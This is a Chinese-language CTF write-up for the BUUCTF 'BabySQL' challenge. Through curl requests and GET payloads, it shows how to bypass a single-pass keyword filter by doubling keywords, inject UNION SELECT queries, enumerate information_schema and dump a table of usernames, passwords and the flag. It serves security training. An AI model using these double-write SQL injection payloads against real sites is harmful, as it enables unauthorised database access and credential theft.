# CTF WriteUp: BabySQL

## 题目信息
- **题目名称**：BabySQL
- **题目类型**：Web (SQL注入)
- **目标地址**：http://74f8f143-fc8e-4009-be51-7453322f3bc1.node5.buuoj.cn:81/

## 知识点
1. **SQL注入**：通过注入点绕过登录验证并执行任意 SQL 语句
2. **双写绕过**：后端对 `or`、`union`、`select`、`from`、`where` 等关键词进行了过滤（替换为空），但未做多次过滤，因此可以采用双写绕过
3. **堆叠/联合查询注入**：使用 `UNION SELECT` 联合查询获取数据库中的表结构和数据

## 解题思路与详细步骤

### 1. 信息收集
访问目标网址，是一个登录页面，包含用户名(username)和密码(password)两个输入框，表单提交到 `check.php`。页面提示："自从前几次网站被日，我对我的网站做了严格的过滤，你们这些黑客死心吧！！！"，说明后端做了关键词过滤。

使用单引号测试注入：
```
GET /check.php?username=admin'&password=admin
```
返回 SQL 语法错误，确认存在 SQL 注入漏洞。

### 2. 过滤规则探测

通过尝试不同关键词，观察返回结果（报错 vs 正常），发现以下关键词被过滤（替换为空）：

```bash
# === SQL原文: SELECT * FROM users WHERE username='$username' AND password='$password' ===

# 测试 or 是否被过滤
# SQL: SELECT * FROM users WHERE username='admin' or 1=1#' AND password='admin'
# or 被过滤后: SELECT * FROM users WHERE username='admin' 1=1#' AND password='admin'  ← 语法错误
# or 未过滤:  SELECT * FROM users WHERE username='admin' or 1=1#' AND password='admin'  ← Login Success
curl "http://target/check.php?username=admin'%20or%201=1%23&password=admin"
# 返回语法错误 → or 被过滤

# 双写测试 oorr
# SQL: SELECT * FROM users WHERE username='admin' oorr 1=1#' AND password='admin'
# 过滤后:  SELECT * FROM users WHERE username='admin' or 1=1#' AND password='admin'  ← 语法正确
curl "http://target/check.php?username=admin'%20oorr%201=1%23&password=admin"
# Login Success → 双写绕过成功，确认 or 被过滤

# 测试 union/select 双写
# SQL: SELECT * FROM users WHERE username='admin' union select 1,2,3#' AND password='admin'
# 过滤后:  SELECT * FROM users WHERE username='admin' 1,2,3#' AND password='admin'  ← 语法错误
curl "http://target/check.php?username=admin'%20union%20select%201,2,3%23&password=admin"
# 报错 → union/select 被过滤

# SQL: SELECT * FROM users WHERE username='admin' ununionion selselectect 1,2,3#'
# 过滤后:  SELECT * FROM users WHERE username='admin' union select 1,2,3#'  ← 语法正确
curl "http://target/check.php?username=admin'%20ununionion%20selselectect%201,2,3%23&password=admin"
# 正常返回 → 双写绕过成功

# 测试 from 双写（information 中的 or 也需双写）
# SQL: SELECT * FROM users WHERE username='1' union select 1,table_name,3 from information_schema.tables where#
# 过滤后:  SELECT * FROM users WHERE username='1' union select 1,table_name,3  information_schema.tables   ← 语法错误
curl "http://target/check.php?username=1'%20ununionion%20selselectect%201,table_name,3%20frfromom%20infoorrmation_schema.tables%20whwhereere%201=1%23&password=admin"
# 正常返回 → from、where、information 中的 or 均被过滤，双写均可绕过

# 测试 where 双写
# SQL: SELECT * FROM users WHERE username='admin' where 1=1#'
# 过滤后:  SELECT * FROM users WHERE username='admin' 1=1#'  ← 语法错误
curl "http://target/check.php?username=admin'%20whwhereere%201=1%23&password=admin"
# 正常返回 → where 被过滤，双写 whwhereere 可绕过
```

通过测试确认以下关键词被过滤（替换为空）：

- `or`
- `union`
- `select`
- `from`
- `where`

### 3. 双写绕过技巧
后端使用类似 `str_replace(['or','union','select','from','where'], '', $input)` 的过滤机制，但只过滤一次。因此可以双写关键词，过滤掉中间的部分后剩下的正好构成原词：

| 原始词 | 双写形式 | 过滤后 |
|--------|---------|--------|
| `or` | `oorr` | `or` |
| `union` | `ununionion` | `union` |
| `select` | `selselectect` | `select` |
| `from` | `frfromom` | `from` |
| `where` | `whwhereere` | `where` |
| `information` | `infoorrmation` | `information` |
| `password` | `passwoorrd` | `password` |

### 4. 确认注入成功
使用 `oorr` 绕过登录：
```
GET /check.php?username=admin' oorr 1=1%23&password=admin
```
返回 `Login Success!`，获取到 admin 用户的密码哈希 `e64a399a69cb527f23ed10d444dd8f61`，确认 SQL 注入成功。

### 5. 确定列数

使用联合查询 `union select` 依次递增列数测试，当列数正确时页面正常返回：

```bash
# 从1列开始试，直到不报错为止
curl "http://target/check.php?username=1'%20ununionion%20selselectect%201%23&password=admin"     # 报错
curl "http://target/check.php?username=1'%20ununionion%20selselectect%201,2%23&password=admin"   # 报错
curl "http://target/check.php?username=1'%20ununionion%20selselectect%201,2,3%23&password=admin" # 正常
```

测试得出表为 **3 列**，且返回 `Hello 2！` 和 `Your password is '3'`，说明第 2 列显示在用户名位置，第 3 列显示在密码位置。

### 6. 获取数据库信息
获取当前数据库名和版本：
```
database() → geek
version() → 10.3.18-MariaDB
```

### 7. 获取表名
查询 `information_schema.tables`，注意 `information` 中的 `or` 需要双写为 `infoorrmation`：
```
GET /check.php?username=1' ununionion selselectect 1,table_name,3 frfromom infoorrmation_schema.tables whwhereere table_schema=database()%23&password=admin
```
得到表名：`b4bsql`

### 8. 获取列名
查询 `information_schema.columns`：
```
GET /check.php?username=1' ununionion selselectect 1,group_concat(column_name),3 frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql'%23&password=admin
```
得到列名：`id`, `username`, `password`

### 9. 获取 Flag
查询 `b4bsql` 表中所有数据，注意 `password` 中包含 `or` 也需要双写：
```
GET /check.php?username=1' ununionion selselectect 1,group_concat(username,':',passwoorrd),3 frfromom b4bsql%23&password=admin
```
获取到数据：

| 用户名 | 密码 |
|--------|------|
| cl4y | i_want_to_play_2077 |
| sql | sql_injection_is_so_fun |
| porn | do_you_know_pornhub |
| git | github_is_different_from_pornhub |
| Stop | you_found_flag_so_stop |
| badguy | i_told_you_to_stop |
| hacker | hack_by_cl4y |
| **flag** | **flag{fcf209d6-8169-4cc3-b59f-cb43266b1e06}** |

## 最终 Flag
`flag{fcf209d6-8169-4cc3-b59f-cb43266b1e06}`

## 知识点总结

### 双写绕过原理

当后端使用 `str_replace(['or','union','select','from','where'], '', $input)` 等函数将危险关键词替换为空字符串时（且只执行一次过滤），攻击者可以通过双写来绕过。

**核心理解：过滤器是按关键词子串匹配，不是按整个单词匹配。** 它只查找输入中是否包含这些关键词片段，找到了就删掉。因此双写时只需要重复**被过滤的那个关键词本身**，而不是重复整个单词。

以 `information` 为例，需要明确一点：`information` 本身不是过滤关键词，但它**包含**了过滤关键词 `or`：

```
information
  ↑↑
  └─ 过滤器的 `or` 在这里匹配到了
```

过滤过程：`information` = `inf` + `or` + `mation`，中间的 `or` 被删掉 → 只剩 `infmation`（乱码）。

双写时只需在 `or` 的位置重复一次：
```
infoorrmation = inf + or + or + mation
                     ↑_____↑
                     过滤删掉中间的 or
                     ↓
               inf + or + mation = information  ✓
```

同理其他所有词：

| 单词 | 包含的过滤关键词 | 双写方式 | 原理 |
|------|----------------|---------|------|
| `select` | `select` | `sel`+`select`+`ect` = **`selselectect`** | 整体就是关键词，在中间插入一次 |
| `union` | `union` | `un`+`union`+`ion` = **`ununionion`** | 同上 |
| `from` | `from` | `f`+`from`+`om` = **`frfromom`** | 同上 |
| `where` | `where` | `wh`+`where`+`ere` = **`whwhereere`** | 同上 |
| `order` | `or`（包含在其中） | `or`+`or`+`der` = **`oorrder`** | 只双写 `or`，不是整体重复 |
| `information` | `or`（包含在其中） | `inf`+`or`+`or`+`mation` = **`infoorrmation`** | 只双写 `or` |
| `password` | `or`（包含在其中） | `passw`+`or`+`or`+`d` = **`passwoorrd`** | 只双写 `or` |

**一句话总结：看这个单词里哪个子串是被过滤的关键词，就把那个子串写两遍，剩下的部分不动。**

### 过滤词对数据字典的影响
需要注意过滤词不仅影响 SQL 关键字，也影响数据字典中的字符串（表名、列名等）：
- `information` 中的 `or` 会被过滤 → 需双写为 `infoorrmation`
- `password` 中的 `or` 会被过滤 → 需双写为 `passwoorrd`
- 同理，任何包含过滤关键词的表名/列名都需要对应双写
